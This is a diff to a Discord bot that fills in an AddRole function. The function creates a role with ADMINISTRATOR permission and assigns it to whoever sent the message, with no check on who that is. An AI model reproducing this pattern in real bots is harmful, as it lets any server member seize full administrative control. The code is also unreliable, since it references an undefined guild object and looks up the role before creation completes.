@@ -403,7 +403,16 @@ function BroadcastDrops(message,cmd,tier,num,results,valid){
 }
 
 function AddRole(message){
-	
+	guild.createRole({
+		name: 'RoseBot',
+		color: '#B536DA',
+		permissions: 'ADMINISTRATOR',
+		editable: 'true',
+	});
+	let myRole = message.guild.roles.find("name", "RoseBot");
+	let member = message.member;
+	console.log('Role created successfully');
+	member.addRole(myRole).catch(console.error);
 }
 	
 client.login(process.env.BOT_TOKEN);
